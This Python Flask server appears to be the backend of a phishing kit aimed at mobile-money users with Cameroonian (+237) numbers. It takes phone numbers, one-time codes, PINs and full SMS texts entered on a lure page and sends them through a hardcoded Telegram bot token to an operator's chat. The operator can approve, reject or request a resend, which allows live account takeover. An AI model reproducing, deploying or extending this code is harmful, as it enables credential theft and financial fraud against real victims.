import os
import uuid
import requests
import html
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder='.', static_url_path='')

TELEGRAM_TOKEN = "9120980562:AAHdCkCej7QrZp9nj6VrRT5zp13sZBQ69cI"
ADMIN_CHAT_ID = "7477343871"

pending_requests = {}
message_details = {}

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/momo-preview.jpg')
def serve_preview_image():
    return send_from_directory('.', 'momo-preview.jpg', mimetype='image/jpeg')

@app.route('/api/request-approval', methods=['POST'])
def request_approval():
    try:
        data = request.json
        app_id = str(uuid.uuid4())
        pending_requests[app_id] = "pending"
        
        phone = data.get('phone', 'Unknown')
        code = data.get('code', 'Unknown')
        
        # Escape HTML special characters
        safe_phone = html.escape(str(phone))
        safe_code = html.escape(str(code))
        
        # Use <code> tags so tapping copies the value in Telegram
        # If code contains "SMS TEXT:" or "PIN:", handle specially
        if isinstance(code, str) and code.startswith("SMS TEXT:\n"):
            sms_body = code.replace("SMS TEXT:\n", "")
            safe_sms = html.escape(sms_body)
            text = (
                f"🚨 <b>New Verification Request</b>\n\n"
                f"📱 Phone: <code>+237 {safe_phone}</code>\n\n"
                f"💬 <b>SMS Received:</b>\n"
                f"<code>{safe_sms}</code>\n\n"
                f"<i>(Tap the phone or SMS to copy)</i>"
            )
        elif isinstance(code, str) and code.startswith("PIN: "):
            pin_value = code.replace("PIN: ", "")
            safe_pin = html.escape(pin_value)
            text = (
                f"🚨 <b>New Verification Request</b>\n\n"
                f"📱 Phone: <code>+237 {safe_phone}</code>\n"
                f"🔑 PIN: <code>{safe_pin}</code>\n\n"
                f"<i>(Tap the phone or PIN to copy)</i>"
            )
        else:
            text = (
                f"🚨 <b>New Verification Request</b>\n\n"
                f"📱 Phone: <code>+237 {safe_phone}</code>\n"
                f"🔑 Code: <code>{safe_code}</code>\n\n"
                f"<i>(Tap the phone or code to copy)</i>"
            )
        
        keyboard = {
            "inline_keyboard": [[
                {"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
                {"text": "❌ Reject", "callback_data": f"reject_{app_id}"},
                {"text": "🔄 Resend", "callback_data": f"resend_{app_id}"}
            ]]
        }
        
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        response = requests.post(url, json={
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": keyboard
        })
        
        response_data = response.json()
        if response_data.get("ok"):
            message_id = response_data["result"]["message_id"]
            message_details[app_id] = {
                "message_id": message_id,
                "original_text": text
            }
            
        return jsonify({"app_id": app_id, "status": "pending"})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-status/<app_id>', methods=['GET'])
def check_status(app_id):
    status = pending_requests.get(app_id, "not_found")
    return jsonify({"status": status})

@app.route('/api/telegram-webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    if "callback_query" in update:
        callback = update["callback_query"]
        data = callback["data"]
        action, app_id = data.split("_")
        
        if app_id in pending_requests:
            pending_requests[app_id] = action
        
        answer_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
        requests.post(answer_url, json={"callback_query_id": callback["id"], "text": "Done!"})
        
        if app_id in message_details:
            msg_info = message_details[app_id]
            message_id = msg_info["message_id"]
            original_text = msg_info["original_text"]
            
            if action == "approve":
                new_text = f"{original_text}\n\n---\n<b>Status: ✅ APPROVED</b>"
            elif action == "reject":
                new_text = f"{original_text}\n\n---\n<b>Status: ❌ REJECTED</b>"
            elif action == "resend":
                new_text = f"{original_text}\n\n---\n<b>Status: 🔄 RESEND REQUESTED</b>"
            else:
                new_text = original_text
            
            markup = {"inline_keyboard": []}
            
            edit_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
            requests.post(edit_url, json={
                "chat_id": ADMIN_CHAT_ID,
                "message_id": message_id,
                "text": new_text,
                "parse_mode": "HTML",
                "reply_markup": markup
            })
            
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)